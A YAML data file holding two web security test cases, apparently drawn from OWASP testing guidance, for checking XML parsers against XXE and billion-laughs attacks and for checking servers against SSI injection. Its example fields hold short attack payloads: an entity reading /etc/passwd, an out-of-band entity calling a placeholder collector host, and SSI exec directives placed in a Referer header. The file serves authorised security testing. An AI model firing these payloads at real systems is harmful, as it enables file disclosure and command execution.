- id: WEB-INJ-008
  sheet: WEB
  category: INJ
  title: Test XML parser configuration for XXE and billion-laughs attacks
  objective: Finds XML parsers that resolve external entities or expand nested entities without limits.
  preconditions:
  - Do not run on production.
  steps:
  - Submit an XML document with a DOCTYPE that defines an external entity pointing to a local file.
  - Observe whether the response discloses the file content.
  - If no direct output exists, use an out-of-band DOCTYPE pointing to a collector host and watch for a callback.
  - Submit a nested entity expansion payload and monitor server memory and CPU.
  example: '<!DOCTYPE user [ <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><user>&xxe;</user> ; OOB: <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://collaborator-host/collect">%xxe;]> ; billion laughs nested
    <!ENTITY> chain'
  expected: The parser disables DOCTYPE declarations and external entity resolution and limits entity expansion.
  severity: Critical
  test_type: Manual
  level: ASVS L1
  refs:
    wstg:
    - WSTG-INJT-07
    asvs:
    - V1.5.1
    cheatsheet:
    - XML_External_Entity_Prevention_Cheat_Sheet
    cwe:
    - CWE-611
    - CWE-776
    capec:
    - CAPEC-228
    - CAPEC-197
  sources_read:
  - sources/repos/wstg/document/4-Web_Application_Security_Testing/07-Injection/07-XML_Injection.md
  - sources/asvs5/OWASP_Application_Security_Verification_Standard_5.0.0_en.flat.json
  - sources/repos/CheatSheetSeries/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.md
- id: WEB-INJ-009
  sheet: WEB
  category: INJ
  title: Test server-side includes for SSI injection
  objective: Finds pages that interpret user input as a server-side include directive.
  preconditions:
  - Do not run on production.
  steps:
  - Determine whether the web server supports SSI, for example .shtml pages.
  - Find inputs including headers and cookies that are reflected into SSI-processed pages.
  - Submit an echo directive to read a server variable.
  - Submit an exec directive to request operating system command output.
  example: 'Referer: <!--#exec cmd="/bin/ps ax"--> ; <!--#echo var="DOCUMENT_NAME" -->'
  expected: SSI directives in user input are neutralized and the exec directive is disabled on the server.
  severity: Critical
  test_type: Manual
  refs:
    wstg:
    - WSTG-INJT-08
    cwe:
    - CWE-97
    capec:
    - CAPEC-101
